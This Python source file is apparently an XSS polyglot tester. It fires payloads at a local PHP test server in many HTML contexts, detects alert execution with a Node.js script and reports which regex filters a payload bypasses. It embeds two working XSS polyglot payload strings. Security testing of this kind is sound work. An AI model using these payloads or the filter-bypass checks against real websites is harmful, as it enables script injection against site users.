#!/usr/bin/python
# coding: utf-8
"""
____  ________________________
\   \/  /\______   \__    ___/
 \     /  |     ___/ |    |   
 /     \  |    |     |    |   
/___/\  \ |____|     |____|   
      \_/  XSS Polyglot Tester
                       @xajkep
   
TODO || IDEAS:
[-] OOP
[-] Add an other JSON setting file for:
    * The localhost URL and port
    * All the constants (file paths, default payload, verbosity)
    * Nodejs binary path
[-] Support of additionnal JS functions execution detection
    + prompt
    + confirm
    + console.log, console.debug, console.error, etc.
    + ?
[-] Simulation of additionnal user interactions
    + scrolling
    + double click
    + right click
    + mouse over
    + key up, key down, key press
    + focus
    + ?

0.1.0b:
[-] Public release

0.1.0a:
[+] Add "test" mode, to test if all contexts are correctly working (via "test" in contexts.json)
[+] Clean nodejs code -> simplify click system
[+] Add verbose output for run_tests
[+] Clean test_contexts
[*] Update README.md
[+] Use a default payload if --xss is not set 
[+] Add listing of available contexts and filters
[+] Add help for the command arguments.

0.0.9:
[+] Clean the code and remove testing files
[+] Create requirements.txt file for easy pip install
[+] Move JSON file to root
[+] Adding README.md file with setup instructions for Debian and other details
[+] Add auto click on <video>, <x> and <img>
[+] Add new contexts
[*] Fix urlencode and htmlescape
[+] For each contexts, add one valid XSS payload (for testing purpose)

0.0.8:
[+] Adding argparse (+ new arguments)
[+] Adding new contexts

0.0.7:
[+] Auto click on <div>, <a>, <input>, <p> and <button>
[+] Adding new contexts

"""
import json
import subprocess
from termcolor import colored
from time import time
import argparse
import re
import sys

VERBOSE = False

# Default polyglot
#XSS = "--></textarea></style></title></script><svg \";alert()//' onload=alert() onclick=alert()//"
XSS = "jaVaSCriPt:/*\\x3csvG/oNloAd=alert()\\x3e*/alert()//</stYle/</tiTle/</texTarEa/</scrIpt/--!><sVg//*`/*\"/*'/**/(_=alert())//\\%0a;alert()//'/oNlOad=alert() OncLick=alert()//>;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoKT4K"

# FROM https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
#XSS = "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"

def info(s):
    print(colored("[+] %s" % s, "white"))

def action(s):
    print(colored("[-] %s" % s, "yellow"))

def fail(s):
    print(colored("[!] %s" % s, "red"))

def success(s):
    print(colored("[+] %s" % s, "blue"))

def verbose(s):
    if VERBOSE:
        print(colored("[v] %s" % s, "grey"))

CONTEXTS_FILE = "contexts.json"
FILTERS_FILE = "filters.json"
SERVER_PATH = "server"

"""
Test an XSS payload in all contexts defined in contexts.json file.
"""
def test_contexts(XSS, selected_context = None):
    tmp = json.loads(open(CONTEXTS_FILE, 'r').read())['contexts']
    contexts = set()
    if selected_context != None:
        for c in tmp:
            if c['name'] == selected_context:
                contexts = [c]
        
        if len(contexts) == 0:
            fail("This context name doesn't exist !")
            exit()
    else:
        contexts = tmp
    
    execution_counter = 0
    start_time = time()
    for context in contexts:

        action("Testing %s" % context['name'])
        
        url = "http://127.0.0.1:8080/%s.php?c=%s" % (context['name'], XSS)

        command = [
            '/usr/bin/nodejs', 
            'index.js', 
            '--url', 
            url,
        ]
        a = subprocess.Popen(command, stdout=subprocess.PIPE).stdout.read()
        if a.find("1337") > -1:
            success("alert detected !")
            execution_counter += 1
        else:
            fail("not executed") 

        print("")

    elapsed_time = time() - start_time
    info("Executed in %i/%i contexts in %.2f seconds" % (execution_counter, len(contexts), elapsed_time))

"""
Apply filters defined in filters.json to an XSS payload
"""
def test_filters(xss):
    filters = json.loads(open(FILTERS_FILE, 'r').read())['filters']

    start_time = time()
    for filter in filters:
        if re.match(filter['pattern'], xss):
            fail("Blocked by filter %s" % filter['name']) 
        else:
            success("Bypass filter %s" % filter['name'])

"""
Run all tests defined in contexts.json
(all of them should be executed)
"""
def run_tests(selected_context = None):
    tmp = json.loads(open(CONTEXTS_FILE, 'r').read())['contexts']
    contexts = set()
    if selected_context != None:
        for c in tmp:
            if c['name'] == selected_context:
                contexts = [c]
        
        if len(contexts) == 0:
            fail("This context name doesn't exist !")
            exit()
    else:
        contexts = tmp
    
    execution_counter = 0
    start_time = time()
    for context in contexts:

        action("Testing %s" % context['name'])
        verbose("%s" % context['test'])
        
        url = "http://127.0.0.1:8080/%s.php?c=%s" % (context['name'], context['test'])
        a = subprocess.Popen(
            ['/usr/bin/nodejs', 'index.js', '--url', url],
            stdout=subprocess.PIPE).stdout.read()
        if a.find("1337") > -1:
            info("alert detected !")
            execution_counter += 1
        else:
            fail("not executed") 

        print("")

    elapsed_time = time() - start_time
    nb_tests = len(contexts)
    info("%i tests done in %.2f seconds" % (nb_tests, elapsed_time))
    info("%i/%i successes" % (execution_counter, nb_tests))
    info("%i/%i failures" % (nb_tests - execution_counter, nb_tests))

"""
List all available contexts
"""
def list_all_contexts(target=''):
    if target == 'context':
        file = CONTEXTS_FILE
    elif target == 'filter':
        file = FILTERS_FILE
    else:
        return

    entities = json.loads(open(file, 'r').read())[target+'s']

    for entity in entities:
        print(entity['name'])


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--mode', help="Accepted values: 'context', 'filter' or 'test'")
    parser.add_argument('--xss', help='XSS payload')
    parser.add_argument('--context')
    parser.add_argument('--list', help='List available contexts or filters')
    parser.add_argument('--verbose', help="Yes or No")    
    
    print """
    ____  ________________________
    \   \/  /\______   \__    ___/
     \     /  |     ___/ |    |   
     /     \  |    |     |    |   
    /___/\  \ |____|     |____|   
          \_/  XSS Polyglot Tester
                           @xajkep
    """

    if len(sys.argv) == 0:
        parser.print_help()
        sys.exit(1)
    
    args = parser.parse_args()

    if args.xss != None:
        xss = args.xss
    else:
        verbose("No XSS payload set with --xss argument, using the default payload:")
        verbose(XSS)
        print("")
        xss = XSS

    if args.mode == 'filter':
        test_filters(xss)
    elif args.mode == 'context':
        test_contexts(xss, args.context)
    elif args.mode == 'test':
        run_tests(args.context)
    elif args.list != '':
        list_all_contexts(args.list)


if __name__ == '__main__':
    main()